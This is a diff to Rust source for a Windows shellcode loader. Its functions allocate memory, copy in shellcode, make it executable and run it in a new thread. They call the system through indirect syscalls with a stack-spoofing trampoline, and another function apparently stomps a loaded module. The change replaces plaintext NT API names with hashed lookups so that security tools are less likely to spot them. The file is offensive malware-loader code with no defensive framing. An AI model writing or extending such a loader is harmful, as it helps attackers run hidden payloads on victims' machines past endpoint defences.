@@ -3,10 +3,11 @@ use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE};
 
 #[cfg(target_os = "windows")]
 pub unsafe fn run_no_rwx(shellcode: &[u8]) {
-    use crate::evasion::syscalls::get_ssn;
+    use crate::evasion::syscalls::get_ssn_h;
+    use crate::resolve::api_hash::h;
     use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
 
-    let (ssn_alloc, tramp_alloc) = match get_ssn(b"NtAllocateVirtualMemory") {
+    let (ssn_alloc, tramp_alloc) = match get_ssn_h(h::NT_ALLOC_VM) {
         Some(v) => v,
         None => return,
     };
@@ -27,7 +28,7 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
     let ptr = base_addr as *mut u8;
     core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());
 
-    let (ssn_prot, tramp_prot) = match get_ssn(b"NtProtectVirtualMemory") {
+    let (ssn_prot, tramp_prot) = match get_ssn_h(h::NT_PROT_VM) {
         Some(v) => v,
         None => return,
     };
@@ -42,7 +43,7 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
         0,
     );
 
-    let (ssn_thread, tramp_thread) = match get_ssn(b"NtCreateThreadEx") {
+    let (ssn_thread, tramp_thread) = match get_ssn_h(h::NT_CREATE_THR) {
         Some(v) => v,
         None => return,
     };
@@ -62,7 +63,7 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
         0,
     );
     if status >= 0 && h_thread != 0 {
-        let (ssn_wait, tramp_wait) = match get_ssn(b"NtWaitForSingleObject") {
+        let (ssn_wait, tramp_wait) = match get_ssn_h(h::NT_WAIT_OBJ) {
             Some(v) => v,
             None => return,
         };
@@ -70,7 +71,7 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
             ssn_wait, tramp_wait,
             h_thread as usize, 0, 0, 0, 0, 0,
         );
-        if let Some((ssn_close, tramp_close)) = get_ssn(b"NtClose") {
+        if let Some((ssn_close, tramp_close)) = get_ssn_h(h::NT_CLOSE) {
             crate::evasion::syscalls::indirect_syscall(
                 ssn_close, tramp_close,
                 h_thread as usize, 0, 0, 0, 0, 0,
@@ -104,9 +105,10 @@ pub unsafe fn run_stomped(shellcode: &[u8]) -> bool {
 /// Like run_no_rwx but passes execution through the stack-spoof trampoline.
 #[cfg(target_os = "windows")]
 pub unsafe fn run_no_rwx_spoof(shellcode: &[u8]) {
-    use crate::evasion::syscalls::get_ssn;
+    use crate::evasion::syscalls::get_ssn_h;
+    use crate::resolve::api_hash::h;
 
-    let (ssn_alloc, tramp_alloc) = match get_ssn(b"NtAllocateVirtualMemory") {
+    let (ssn_alloc, tramp_alloc) = match get_ssn_h(h::NT_ALLOC_VM) {
         Some(v) => v,
         None => return,
     };
@@ -127,7 +129,7 @@ pub unsafe fn run_no_rwx_spoof(shellcode: &[u8]) {
     let ptr = base_addr as *mut u8;
     core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());
 
-    let (ssn_prot, tramp_prot) = match get_ssn(b"NtProtectVirtualMemory") {
+    let (ssn_prot, tramp_prot) = match get_ssn_h(h::NT_PROT_VM) {
         Some(v) => v,
         None => return,
     };
